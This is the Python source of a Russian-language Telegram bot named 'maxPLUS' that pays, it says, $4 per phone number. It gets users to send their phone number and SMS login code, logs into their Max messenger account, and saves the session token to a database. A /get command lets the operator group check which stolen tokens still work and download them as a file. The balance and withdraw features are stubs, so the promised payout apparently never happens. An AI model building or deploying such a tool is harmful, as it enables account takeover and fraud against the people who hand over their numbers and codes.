import asyncio
import os
import asyncpg
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pymax import Client, ExtraConfig

# === Конфигурация из переменных окружения ===
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
DATABASE_URL = os.getenv("DATABASE_URL")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
pending = {}
waiting_code = {}
expecting_phone = set()
db_pool = None

# === TelegramSmsProvider ===
class TelegramSmsProvider:
    def __init__(self):
        self._queue = asyncio.Queue()

    async def set_code(self, code: str):
        await self._queue.put(code)

    async def get_code(self, phone: str) -> str:
        return await self._queue.get()

# === Работа с PostgreSQL ===
async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DATABASE_URL)
    async with db_pool.acquire() as conn:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS approved_groups (
                group_id BIGINT PRIMARY KEY
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS tokens (
                phone TEXT PRIMARY KEY,
                token TEXT NOT NULL,
                alive BOOLEAN DEFAULT TRUE,
                created_at TIMESTAMP DEFAULT NOW()
            )
        """)

async def is_group_approved(group_id: int) -> bool:
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT 1 FROM approved_groups WHERE group_id = $1", group_id)
        return row is not None

async def save_token_to_db(phone: str, token: str):
    async with db_pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO tokens (phone, token) VALUES ($1, $2) "
            "ON CONFLICT (phone) DO UPDATE SET token = $2, alive = TRUE, created_at = NOW()",
            phone, token
        )

async def get_all_tokens():
    async with db_pool.acquire() as conn:
        rows = await conn.fetch("SELECT phone, token, alive FROM tokens")
        return [{"phone": r["phone"], "token": r["token"], "alive": r["alive"]} for r in rows]

async def update_token_status(phone: str, alive: bool):
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE tokens SET alive = $1 WHERE phone = $2", alive, phone)

# === Проверка токена на живость ===
async def check_token_alive(token: str) -> bool:
    try:
        client = Client(
            phone="+70000000000",
            work_dir="cache",
            session_name="check.db",
            extra_config=ExtraConfig(token=token),
        )
        await asyncio.wait_for(client.start(), timeout=10)
        return True
    except Exception:
        return False

# === Чтение токена из SQLite-сессии PyMax ===
def read_token_from_session(phone: str) -> str | None:
    import sqlite3
    try:
        conn = sqlite3.connect(f"cache/{phone}.db")
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM sessions WHERE key = 'token'")
        row = cursor.fetchone()
        conn.close()
        return row[0] if row else None
    except Exception:
        return None

# === Проверка: одобренная группа ===
async def is_approved_group(msg: Message) -> bool:
    if msg.chat.type in ("group", "supergroup"):
        return await is_group_approved(msg.chat.id)
    return False

# === Главное меню (текст) ===
def main_menu_text():
    return (
        "👋 Приветствуем вас в боте maxPLUS\\.\n\n"
        "Данный сервис полностью автоматизирован: вводите номер, авторизуетесь, получаете доход\\.\n"
        "Бот работает 24/7, мгновенно обрабатывает SMS и авторизует номера без ручного вмешательства\\.\n\n"
        "Актуальная цена:\n"
        "💳 \\- \\$4\\.00"
    )

def main_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Профиль", callback_data="profile"),
            InlineKeyboardButton(text="FAQ", callback_data="faq")
        ],
        [
            InlineKeyboardButton(text="Начать работу", callback_data="start_work")
        ]
    ])

# === Обработчики команд ===

@dp.message(Command("start"))
async def start_cmd(msg: Message):
    await msg.answer(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")

@dp.message(Command("cancel"))
async def cancel_cmd(msg: Message):
    expecting_phone.discard(msg.from_user.id)
    waiting_code.pop(msg.from_user.id, None)
    pending.pop(msg.from_user.id, None)
    await msg.answer(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")

@dp.message(Command("help"))
async def help_cmd(msg: Message):
    if not await is_approved_group(msg):
        return

    text = (
        "📋 <b>Команды MaxPlus:</b>\n\n"
        "/get — Получить все токены и статистику\n"
        "/help — Показать эту справку\n\n"
        "<b>Как авторизоваться:</b>\n"
        "1. Отправь номер в личку боту\n"
        "2. Дождись SMS\n"
        "3. Введи код <b>ответом</b> на второе сообщение бота"
    )
    await msg.answer(text, parse_mode="HTML")

@dp.message(Command("set"))
async def set_group(msg: Message):
    if msg.chat.type not in ("group", "supergroup"):
        return
    if msg.from_user.id != ADMIN_ID:
        return

    try:
        group_id = int(msg.text.split()[1])
        async with db_pool.acquire() as conn:
            await conn.execute(
                "INSERT INTO approved_groups (group_id) VALUES ($1) ON CONFLICT DO NOTHING",
                group_id
            )
        await msg.answer(f"✅ Группа {group_id} одобрена")
    except (IndexError, ValueError):
        await msg.answer("❌ Используй: /set ID_группы")

@dp.message(Command("unset"))
async def unset_group(msg: Message):
    if msg.chat.type not in ("group", "supergroup"):
        return
    if msg.from_user.id != ADMIN_ID:
        return

    try:
        group_id = int(msg.text.split()[1])
        async with db_pool.acquire() as conn:
            await conn.execute("DELETE FROM approved_groups WHERE group_id = $1", group_id)
        await msg.answer(f"✅ Группа {group_id} больше не одобрена")
    except (IndexError, ValueError):
        await msg.answer("❌ Используй: /unset ID_группы")

@dp.message(Command("get"))
async def get_tokens(msg: Message):
    if not await is_approved_group(msg):
        return

    status_msg = await msg.answer("⏳ Собираю токены...")
    tokens = await get_all_tokens()

    if not tokens:
        return await status_msg.edit_text("📭 Токенов пока нет")

    text = f"📊 Всего токенов: {len(tokens)}\n\n"
    alive = 0
    dead = 0

    for t in tokens:
        phone = t["phone"]
        token = t["token"]
        is_alive = await check_token_alive(token)
        await update_token_status(phone, is_alive)
        if is_alive:
            alive += 1
            text += f"✅ {phone}\n"
        else:
            dead += 1
            text += f"❌ {phone}\n"

    text += f"\nЖивых: {alive} | Мёртвых: {dead}"

    file_text = ""
    for t in tokens:
        file_text += f"{t['phone']} — {t['token']}\n"

    from io import BytesIO
    file = BytesIO(file_text.encode())
    file.name = "tokens.txt"

    await msg.answer_document(file, caption=text)

# === Обработчики callback'ов ===

@dp.callback_query(lambda c: c.data == "profile")
async def profile_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    text = (
        f"🪪 Ваш ID: {user_id}\n"
        "💰 Баланс: \\$0\\.00"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Вывести", callback_data="withdraw"),
            InlineKeyboardButton(text="Назад", callback_data="back_to_start")
        ]
    ])

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="MarkdownV2")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_start")
async def back_to_start_callback(callback: CallbackQuery):
    expecting_phone.discard(callback.from_user.id)
    await callback.message.edit_text(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    await callback.answer("💰 Вывод средств", show_alert=True)

@dp.callback_query(lambda c: c.data == "faq")
async def faq_callback(callback: CallbackQuery):
    await callback.answer("❓ FAQ", show_alert=True)

@dp.callback_query(lambda c: c.data == "start_work")
async def start_work_callback(callback: CallbackQuery):
    expecting_phone.add(callback.from_user.id)
    text = (
        "📧 В следующем сообщении отправьте номер телефона в международном формате\n\n"
        "Для завершения работы введите /cancel"
    )
    await callback.message.edit_text(text)
    await callback.answer()

# === Обработчик номера телефона ===

@dp.message(F.text, ~F.text.startswith("/"))
async def phone_handler(msg: Message):
    if msg.chat.type in ("group", "supergroup"):
        return

    if msg.from_user.id in waiting_code:
        return await code_as_reply(msg)

    if msg.from_user.id not in expecting_phone:
        return

    raw = msg.text.strip()
    digits = "".join(c for c in raw if c.isdigit())

    if len(digits) == 11 and digits.startswith("7"):
        phone = "+" + digits
    elif len(digits) == 11 and digits.startswith("8"):
        phone = "+7" + digits[1:]
    elif len(digits) == 10:
        phone = "+7" + digits
    else:
        return await msg.answer("❌ Не удалось распознать номер. Отправьте в формате +79161234567")

    expecting_phone.discard(msg.from_user.id)

    sms_provider = TelegramSmsProvider()
    client = Client(
        phone=phone,
        work_dir="cache",
        session_name=f"{phone}.db",
        sms_code_provider=sms_provider,
        extra_config=ExtraConfig(log_level="INFO"),
    )

    asyncio.create_task(run_client(msg, client, phone, sms_provider))

    await msg.answer(f"📤 SMS-код отправлен на номер {phone}. Ожидайте сообщение в течение минуты.")
    await asyncio.sleep(1.5)
    waiting_code[msg.from_user.id] = True
    await msg.answer("📩 Введите код из SMS ответом на это сообщение:")

async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
    try:
        pending[msg.from_user.id] = {"provider": sms_provider, "phone": phone}
        await client.start()
        waiting_code.pop(msg.from_user.id, None)

        token = read_token_from_session(phone)
        if token:
            await save_token_to_db(phone, token)

        await msg.answer(f"✅ {phone} авторизован!\nТокен сохранён в базу данных")
    except Exception as e:
        waiting_code.pop(msg.from_user.id, None)
        error_text = str(e).lower()
        error_name = type(e).__name__.lower()

        if "2fa" in error_text or "password" in error_text:
            await msg.answer("❌ На этом номере включена двухфакторная аутентификация. Авторизация невозможна")
        elif "auth" in error_name or "code" in error_text or "token" in error_text:
            await msg.answer("❌ Неверный код или номер заблокирован")
        elif "connect" in error_name or "network" in error_text or "timeout" in error_text:
            await msg.answer("❌ Проблемы с сетью. Попробуй позже")
        elif "already" in error_text or "session" in error_text:
            await msg.answer("ℹ️ Этот номер уже авторизован")
        else:
            await msg.answer(f"❌ Ошибка: {e}")
    finally:
        pending.pop(msg.from_user.id, None)

async def code_as_reply(msg: Message):
    if msg.from_user.id not in pending:
        waiting_code.pop(msg.from_user.id, None)
        return await msg.answer("❌ Сессия устарела. Отправь номер заново")

    code = msg.text.strip()

    if not code.isdigit() or len(code) != 6:
        return await msg.answer("❌ Код должен состоять из шести цифр. Введите код ответом на сообщение выше")

    data = pending[msg.from_user.id]
    provider = data["provider"]
    waiting_code.pop(msg.from_user.id, None)
    await provider.set_code(code)
    await msg.answer("✅ Код принят, авторизую...")

async def main():
    await init_db()
    print("Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
